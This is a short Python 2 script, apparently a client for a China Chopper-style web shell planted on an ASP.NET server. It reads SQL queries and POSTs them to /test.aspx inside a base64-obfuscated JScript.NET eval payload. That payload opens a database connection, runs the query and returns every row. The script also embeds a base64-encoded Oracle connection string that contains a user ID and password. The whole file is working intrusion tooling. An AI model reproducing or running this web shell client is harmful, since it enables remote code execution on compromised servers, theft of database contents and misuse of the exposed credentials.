#! /usr/bin/env python
#
# Copyright 2013 fio.wind <fiowind.zfx@gmail.com>

import urllib
import httplib 
import base64

print 'LibTool 1.0.0  [2013 July , By Fio.Wind]'
print "example:'select 1+1 from dual'"

sql_str = raw_input('Please input pl/sql:')
#sql_str = "SELECT RD_NAME FROM LT_READER WHERE RD_NUMBER=''"

while sql_str<>'exit':
	sql_str = sql_str.upper()
	encode_sql = base64.b64encode(sql_str)
	test_data = {'pass':'Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("dmFyIENvbm49bmV3IEFjdGl2ZVhPYmplY3QoIkFkb2RiLmNvbm5lY3Rpb24iKTt2YXIgc3RyU1FMOlN0cmluZz1TeXN0ZW0uVGV4dC5FbmNvZGluZy5HZXRFbmNvZGluZyg2NTAwMSkuR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoUmVxdWVzdC5JdGVtWyJ6MiJdKSk7Q29ubi5Db25uZWN0aW9uU3RyaW5nPVN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKTtDb25uLkNvbm5lY3Rpb25UaW1lb3V0PTEwO0Nvbm4uT3BlbigpO3ZhciBDTzpTdHJpbmc9Ilx0fFx0IixSTjpTdHJpbmc9IlxyXG4iLERhdDpTdHJpbmc7dmFyIFJzPUNvbm4uRXhlY3V0ZShzdHJTUUwpO3ZhciBpOkludDMyPVJzLkZpZWxkcy5Db3VudCxjOkludDMyO2ZvcihjPTA7YzxpO2MrKyl7UmVzcG9uc2UuV3JpdGUoUnMuRmllbGRzKGMpLk5hbWUrQ08pO31SZXNwb25zZS5Xcml0ZShSTik7d2hpbGUoIVJzLkVPRiAmJiAhUnMuQk9GKXtmb3IoYz0wO2M8aTtjKyspe0RhdD1Scy5GaWVsZHMoYykuVmFsdWU7UmVzcG9uc2UuV3JpdGUoRGF0KTtSZXNwb25zZS5Xcml0ZShDTyk7fVJlc3BvbnNlLldyaXRlKFJOKTtScy5Nb3ZlTmV4dCgpO31Db25uLkNsb3NlKCk7")),"unsafe");}catch(err){Response.Write("ERROR:// "+err.message);}Response.Write("|<-");Response.End();',
		     'z1':'UHJvdmlkZXI9T3JhT0xFREIuT3JhY2xlO0RhdGEgU291cmNlPXR0ZGJfNjE7VXNlciBJZD10dG1pcztQYXNzd29yZD13c2hzeXNoZXdsZXR0emdkO1BlcnNpc3QgU2VjdXJpdHkgSW5mbz1UcnVlOw==',
		     'z2':encode_sql}
	test_data_urlencode = urllib.urlencode(test_data)
	ttdb = base64.b64decode('yourencodeip')
	headerdata = {"Content-type": "application/x-www-form-urlencoded"}
	conn = httplib.HTTPConnection(ttdb)	
	conn.request("POST","/test.aspx",test_data_urlencode,headerdata) 
	response = conn.getresponse()
	print response.status, response.reason 
	res= response.read()	
	print res

	sql_str = raw_input('Please input pl/sql:')



